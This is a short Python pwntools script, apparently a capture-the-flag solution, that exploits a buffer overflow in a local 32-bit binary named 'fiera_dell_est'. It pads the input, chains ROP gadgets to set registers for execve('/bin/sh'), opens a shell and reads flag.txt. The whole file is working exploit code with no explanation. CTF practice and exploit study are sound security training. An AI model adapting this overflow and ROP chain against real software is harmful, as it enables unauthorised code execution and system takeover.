from pwn import *

elf = ELF("./fiera_dell_est")

p = process("./fiera_dell_est")
p.recvline()

rop = b''
# rop.set_regs(eax=0xb, ebx=exe.symbols['shell'], ecx=0x0, edx=0x0)
rop += p32(elf.symbols['topo'])  # pop eax; ret;
rop += p32(0x0b)
rop += p32(elf.symbols['gatto'])  # pop ebx; ret;
rop += p32(elf.symbols['shell'])  # adress of string "/bin/sh"
rop += p32(elf.symbols['cane'])  # pop edx; ret;
rop += p32(0x0)
rop += p32(elf.symbols['bastone'])  # pop ecx; ret;
rop += p32(0x0)
# rop.func_call('angelo_della_morte', [])
rop += p32(elf.symbols['angelo_della_morte'])  # execve("/bin/sh", NULL, NULL)

p.send(b'due\x00' + b'aaaaaaaaaaaa' + rop)

# p.interactive()

p.clean()
p.sendline(b'cat flag.txt')
print(p.recv().decode())
